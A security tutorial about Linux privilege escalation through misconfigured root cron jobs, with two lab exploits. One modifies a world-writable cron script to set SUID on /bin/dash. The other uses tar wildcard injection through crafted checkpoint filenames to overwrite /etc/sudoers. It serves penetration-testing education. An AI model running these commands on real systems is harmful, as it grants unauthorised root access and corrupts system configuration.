<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux Privilege Escalation by Exploiting Cronjobs</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/" rel="bookmark"><time class="entry-date published" datetime="2018-06-19T15:59:21+00:00">June 19, 2018</time><time class="updated" datetime="2025-06-08T13:15:20+00:00">June 8, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">After solving several OSCP Challenges we decided to write the article on the various method used for Linux privilege escalation, that could be helpful for our readers in their penetration testing project. In this article, we will learn “Privilege Escalation by exploiting Cron Jobs” to gain root access of a remote host machine and also examine how a bad implement cron job can lead to Privilege escalation. If you have solved CTF challenges for Post exploit then by reading this article you will realize the several loopholes that lead to privileges escalation.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;">For details, you can read our previous article where we had applied this trick for privilege escalation. Open the links given below:</span></p>
<p class="ai-optimize-8"><em><span style="color: #000000;"><span style="color: #3366ff;"><a style="color: #3366ff;" href="//www.hackingarticles.in/hack-the-box-challenge-europa-walkthrough/">Link1</a>:</span> Hack the Box Challenge: Europa Walkthrough</span></em></p>
<p class="ai-optimize-9"><em><span style="color: #000000;"><span style="color: #3366ff;"><a style="color: #3366ff;" href="//www.hackingarticles.in/hack-milnet-vm-ctf-challenge/">Link2</a>:</span> Hack the Milnet VM (CTF Challenge)</span></em></p>
<h3 class="ai-optimize-10"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-11"><span style="color: #000000;">Introduction</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Cron job</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Crontab syntax</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">Crontab File overwrite</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Lab Setup (Ubuntu)</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Exploiting cron job (Kali Linux)</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Crontab Tar wildcard Injection</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">Lab Setup (Ubuntu)</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">Exploiting cron job (Kali Linux)</span></li>
</ul>
<p class="ai-optimize-20"><span style="color: #000000;"><strong>Let’s Start!!!</strong></span></p>
<h3 class="ai-optimize-21"><span style="color: #800000;">What is a cron job?</span></h3>
<p class="ai-optimize-22"><span style="color: #000000;">System administrators use Cron Jobs for scheduling tasks by executing commands at specific dates and times on the server. They commonly use them for sysadmin jobs such as backups or cleaning /tmp/ directories and so on. The word Cron comes from crontab and it is present inside /etc directory.</span></p>
<p class="ai-optimize-23"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-8i_Z1KLqfpE/WykmCdfWccI/AAAAAAAAXbg/Mln8U-NCqPosOkJfQoCOnbNRKBCo1jCjQCLcBGAs/s1600/0.png"/></span></p>
<p> </p>
<p class="ai-optimize-24"><span style="color: #000000;"><strong>For example:</strong>  Inside crontab, we can add the following entry to print apache error logs automatically in every 1 hour.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">1 0 * * * printf "" &gt; /var/log/apache/error_log</pre>
<h3 class="ai-optimize-25"><span style="color: #800000;">Crontab File overwrite</span></h3>
<p class="ai-optimize-26"><span style="color: #000000;"><strong>Lab Setup for the Poorly configured cron job</strong></span></p>
<p class="ai-optimize-27"><span style="color: #000000;"><strong> </strong><strong>Objective: </strong>Set a new job with help of crontab to run a python script which will erase all data from in a particular directory.</span></p>
<p class="ai-optimize-28"><span style="color: #000000;">Let assume “cleanup” is the directory whose data will be cleared automatically every two minutes. Thus we have saved some data inside /home/cleanup.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir cleanup
cd cleanup
echo "hello friends" &gt; 1.txt
echo "ALL files will be deleted in 2 mints" &gt; 2.txt
echo &gt; 1.php
echo &gt; 2.php
ls</pre>
<p class="ai-optimize-29"><span style="color: #000000;">As you can observe from the given image some files are stored inside the cleanup directory.</span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-3i3xMgCJ3ZQ/WykmC0Z19qI/AAAAAAAAXbk/MPbaULJXFFsmFnvK1Dcf7G1X8YlA61eUQCLcBGAs/s1600/1.png"/></span></p>
<p class="ai-optimize-31"><span style="color: #000000;">Now write a python program in any other directory to delete data from inside /home/cleanup and give it all permission.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
nano cleanup.py
#!/usr/bin/env python
import os
import sys
try:
   os.system('rm -r /home/cleanup/* ')
except:
    sys.exit()
chmod 777 cleanup.py</pre>
<p class="ai-optimize-32"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-rekcEfdLrso/WykmEJJMRvI/AAAAAAAAXbw/EQtEbj1dICYIaNChose8OefokJiuKOGDgCLcBGAs/s1600/2.png"/></span></p>
<p class="ai-optimize-33"><span style="color: #000000;">At last schedule a task with help of crontab to run cleanup.py for every 2 minutes.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/crontab
*/2 *   * * *   root    /tmp/cleanup.py</pre>
<p class="ai-optimize-34"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-2drPELQIYqQ/WykmEpHnP1I/AAAAAAAAXb4/wVNcJwoScloDtdsxBZW8t98_dBvPBiT6QCLcBGAs/s1600/3.png"/></span></p>
<p class="ai-optimize-35"><span style="color: #000000;">Now let’s verify our objectives</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 cleanup.py
cd /home/cleanup
ls
date
ls
date</pre>
<p class="ai-optimize-36"><span style="color: #000000;">Cool!! It is working, as you can see all file has been deleted after two minutes.</span></p>
<p class="ai-optimize-37"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-efJ83a3Zbcs/WykmE25DBZI/AAAAAAAAXb8/dw6etrJocXgoJl0k9wY0a7KBS6GZGKwCgCLcBGAs/s1600/4.png"/></span></p>
<h3 class="ai-optimize-38"><span style="color: #800000;">Post Exploitation</span></h3>
<p class="ai-optimize-39"><span style="color: #000000;">Start your attacking machine and first compromise the target system and then move to privilege escalation stage. Suppose I successfully login into the victim’s machine through ssh and access non-root user terminal. Execute the following command as shown below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/crontab
ls  -al /tmp/cleanup.py
cat /tmp/cleanup.py</pre>
<p class="ai-optimize-40"><span style="color: #000000;"><strong> </strong>From the above steps, we notice the crontab is running python script every two minutes now let’s exploit.</span></p>
<p class="ai-optimize-41"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-z-AQEhD1zYg/WykmFOiMmaI/AAAAAAAAXcA/DKQ4peEIbvIw1B84Mz3IDCFqrDF6smKBgCLcBGAs/s1600/5.png"/></span></p>
<p class="ai-optimize-42"><span style="color: #000000;">There so many methods to gain root access as in this method we enabled SUID bits /bin/dash. It is quite simple, first, open the file through some editor, for example, nanocleanup.py and replace <strong>“rm -r /tmp/*”</strong> from the following line as given below</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">os.system('chmod u+s /bin/dash')</pre>
<p class="ai-optimize-43"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-FVDUH1wvGwg/WykmFxe8uvI/AAAAAAAAXcE/lPJLQOnXbywR3C-9yV-C9l-95slI5hHfwCLcBGAs/s1600/6.png"/></span></p>
<p class="ai-optimize-44"><span style="color: #000000;">After two minutes it will set SUID permission for /bin/dash and when you will run it will give root access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/bin/dash
id
whoami</pre>
<p class="ai-optimize-45"><span style="color: #000000;">Awesome!! We hit the Goal…………………</span></p>
<p class="ai-optimize-46"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-Ej0k9dtN8hw/WykmGNxgjTI/AAAAAAAAXcM/E8f-I3w0QqE21tPJsXRK1bjbO8vQAidiQCLcBGAs/s1600/7.png"/></span></p>
<h3 class="ai-optimize-47"><span style="color: #800000;">Crontab Tar Wildcard Injection</span></h3>
<p class="ai-optimize-48"><span style="color: #000000;"><strong>Lab Setup</strong></span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><strong>Objective: </strong>schedule a task with help of crontab to take backup with tar archival program of HTML directory.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;">The directory should have executable permission whose backup you are going to take.</span></p>
<p class="ai-optimize-51"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-tQnHgNTy60U/WykmF85C6BI/AAAAAAAAXcI/unyCInmj6r0a253v7v5WfO1uAV6EIb4NgCLcBGAs/s1600/8.png"/></span></p>
<p class="ai-optimize-52"><span style="color: #000000;">Now schedule a task with help of crontab to run tar archival program for taking backup of /html inside /var/backups in every 1 minute.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/crontab
*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*</pre>
<p class="ai-optimize-53"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-uwNnIZHu7qI/WykmGi348uI/AAAAAAAAXcQ/1p_dW_BSA149UGEGcVqz_Q3UxlNUpEnUACLcBGAs/s1600/9.png"/></span></p>
<p class="ai-optimize-54"><span style="color: #000000;">Let’s verify the schedule is working or not by executing following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/backup
ls
date</pre>
<p class="ai-optimize-55"><span style="color: #000000;">From the given image below you can notice the html.tgz file has been generated after 1 minute.</span></p>
<p class="ai-optimize-56"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/--v3kpRMVZys/WykmC6IDzHI/AAAAAAAAXbo/uAuRtYGDXzMt7LHNNJTKAMvpxty4aPm8QCLcBGAs/s1600/10.png"/></span></p>
<h3 class="ai-optimize-57"><span style="color: #800000;">Post Exploitation</span></h3>
<p class="ai-optimize-58"><span style="color: #000000;">Start your attacking machine and first compromise the target system and then move to privilege escalation stage. Suppose I successfully login into the victim’s machine through ssh and access non-root user terminal. Then open crontab to view if any job is scheduled.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/crontab</pre>
<p class="ai-optimize-59"><span style="color: #000000;">Here we notice the target has scheduled a tar archival program for every 1 minute and we know that cron job runs as root. Let’s try to exploit.</span></p>
<p class="ai-optimize-60"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-P5oVlG8G8dg/WykmD0A0v3I/AAAAAAAAXbs/F0pzWHRCobQu8DPteV2HeQ84z3hWatMZACLcBGAs/s1600/11.png"/></span></p>
<p class="ai-optimize-61"><span style="color: #000000;">Execute the following command to grant sudo right to logged user and following post exploitation is known as wildcard injection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 'echo "ignite ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; test.sh
echo "" &gt; "--checkpoint-action=exec=sh test.sh"
echo "" &gt; --checkpoint=1
tar cf archive.tar *</pre>
<p class="ai-optimize-62"><span style="color: #000000;">Now after 1 minute it will grant sudo right to the user: ignite as you can confirm this with the given below image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l
sudo bash
whoami</pre>
<p class="ai-optimize-63"><span style="color: #000000;">YUPPIEEEE!!! We have successfully obtained root access.</span></p>
<p class="ai-optimize-64"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-ShYXse_hfAw/WykmEQIjAmI/AAAAAAAAXb0/5M8dpgmp1iUt4O1aqBFT2EkPPvlgVIhGwCLcBGAs/s1600/12.png"/></span></p>
<p class="ai-optimize-65"><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles, an Information Security Consultant, Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
